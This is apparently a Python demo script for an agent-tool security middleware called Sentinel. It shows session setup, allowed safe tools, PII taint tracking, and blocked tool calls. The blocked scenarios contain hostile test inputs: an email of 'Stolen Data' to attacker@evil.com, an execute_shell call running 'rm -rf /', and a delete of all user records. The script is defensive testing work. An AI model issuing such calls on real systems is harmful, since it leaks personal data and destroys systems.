"""
Sentinel Full Demo - Enterprise Tool Security

Demonstrates:
1. Session establishment with HMAC-signed session IDs
2. Tool discovery
3. Safe tool execution (always allowed)
4. PII source access (allowed, but adds taint)
5. External sink blocked after PII access (taint enforcement)
6. Administrative tool blocked (static deny)
7. Spotlighting on all tool outputs
"""
import sys
import os
import asyncio
import logging

# Add project root to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sentinel_sdk import Sentinel

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-7s | %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("SentinelDemo")

# Configuration - Use relative paths, resolved at runtime
POLICY_PATH = os.path.join(os.path.dirname(__file__), "enterprise_policy.yaml")
MOCK_TOOLS_PATH = os.path.join(os.path.dirname(__file__), "mock_tools.py")


def print_section(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}\n")


def print_result(tool: str, result: dict, expected_behavior: str):
    """Pretty-print tool execution result."""
    print(f"[OK] Tool: {tool}")
    print(f"     Expected: {expected_behavior}")
    
    if "content" in result:
        text = result["content"][0].get("text", "")
        # Check for spotlighting
        if "<<<SENTINEL_DATA" in text:
            print(f"     Spotlighted: YES")
            # Extract inner content for display
            lines = text.split('\n')
            inner = '\n'.join(lines[1:-1]) if len(lines) > 2 else text
            print(f"     Content: {inner[:100]}{'...' if len(inner) > 100 else ''}")
        else:
            print(f"     Content: {text[:100]}{'...' if len(text) > 100 else ''}")
    print()


def print_blocked(tool: str, error: str, expected_behavior: str):
    """Pretty-print blocked tool call."""
    print(f"[BLOCKED] Tool: {tool}")
    print(f"          Expected: {expected_behavior}")
    print(f"          Reason: {error}")
    print()


async def run_demo():
    print_section("SENTINEL SECURITY MIDDLEWARE DEMO")
    
    # Verify policy file exists
    if not os.path.exists(POLICY_PATH):
        logger.error(f"Policy file not found: {POLICY_PATH}")
        return
    if not os.path.exists(MOCK_TOOLS_PATH):
        logger.error(f"Mock tools not found: {MOCK_TOOLS_PATH}")
        return
    
    logger.info(f"Policy: {POLICY_PATH}")
    logger.info(f"Tools:  {MOCK_TOOLS_PATH}")
    
    # Use Sentinel.start() API - binary discovered automatically
    upstream_cmd = f"{sys.executable} {MOCK_TOOLS_PATH}"
    
    try:
        client = Sentinel.start(
            upstream=upstream_cmd,
            policy=POLICY_PATH,
            security_level="high"
        )
    except FileNotFoundError as e:
        logger.error(f"Failed to start Sentinel: {e}")
        logger.error("Set SENTINEL_BINARY_PATH environment variable to the sentinel-interceptor binary path")
        return
    
    async with client:
        print_section("SESSION ESTABLISHED")
        logger.info(f"Session ID: {client.session_id}")
        
        # =====================================================================
        # TOOL DISCOVERY
        # =====================================================================
        print_section("TOOL DISCOVERY")
        tools = await client.get_tools_config()
        logger.info(f"Discovered {len(tools)} tools:")
        for t in tools:
            print(f"   • {t['name']}: {t.get('description', '')[:50]}...")
        
        # =====================================================================
        # SCENARIO 1: Safe Operations (Always Allowed)
        # =====================================================================
        print_section("SCENARIO 1: Safe Operations")
        
        # Get current time
        result = await client.execute_tool("get_current_time", {})
        print_result("get_current_time", result, "ALLOWED (safe operation)")
        
        # Calculate
        result = await client.execute_tool("calculate", {"expression": "2 + 2 * 10"})
        print_result("calculate", result, "ALLOWED (safe operation)")
        
        # =====================================================================
        # SCENARIO 2: PII Access (Allowed, Adds Taint)
        # =====================================================================
        print_section("SCENARIO 2: PII Data Access")
        
        result = await client.execute_tool("get_user_profile", {"user_id": "12345"})
        print_result("get_user_profile", result, "ALLOWED (adds PII taint)")
        
        # =====================================================================
        # SCENARIO 3: External Sink After PII (Should be Blocked by Taint)
        # =====================================================================
        print_section("SCENARIO 3: Data Exfiltration Attempt")
        
        try:
            await client.execute_tool("send_email", {
                "to": "attacker@evil.com",
                "subject": "Stolen Data",
                "body": "Here's the PII..."
            })
            print_blocked("send_email", "UNEXPECTED: Should have been blocked!", "BLOCKED (PII taint)")
        except RuntimeError as e:
            print_blocked("send_email", str(e), "BLOCKED (PII taint)")
        
        try:
            await client.execute_tool("post_to_slack", {
                "channel": "general",
                "message": "Check this out..."
            })
            print_blocked("post_to_slack", "UNEXPECTED: Should have been blocked!", "BLOCKED (PII/INTERNAL_DATA taint)")
        except RuntimeError as e:
            print_blocked("post_to_slack", str(e), "BLOCKED (PII taint)")
        
        # =====================================================================
        # SCENARIO 4: Administrative Tools (Static Deny)
        # =====================================================================
        print_section("SCENARIO 4: Privileged Operations")
        
        try:
            await client.execute_tool("execute_shell", {"command": "rm -rf /"})
            print_blocked("execute_shell", "UNEXPECTED: Should have been blocked!", "BLOCKED (static deny)")
        except RuntimeError as e:
            print_blocked("execute_shell", str(e), "BLOCKED (static deny)")
        
        try:
            await client.execute_tool("delete_records", {"table": "users", "condition": "1=1"})
            print_blocked("delete_records", "UNEXPECTED: Should have been blocked!", "BLOCKED (static deny)")
        except RuntimeError as e:
            print_blocked("delete_records", str(e), "BLOCKED (static deny)")
        
        # =====================================================================
        # SUMMARY
        # =====================================================================
        print_section("DEMO COMPLETE")
        print("""
Security Features Demonstrated:
[+] HMAC-signed session IDs with constant-time validation
[+] Static policy enforcement (ALLOW/DENY per tool)
[+] Dynamic taint tracking (PII, INTERNAL_DATA tags)
[+] Data exfiltration prevention (sink blocked after source access)
[+] Spotlighting on all tool outputs (prompt injection defense)
[+] Process isolation via Windows Job Objects
        """)


if __name__ == "__main__":
    asyncio.run(run_demo())
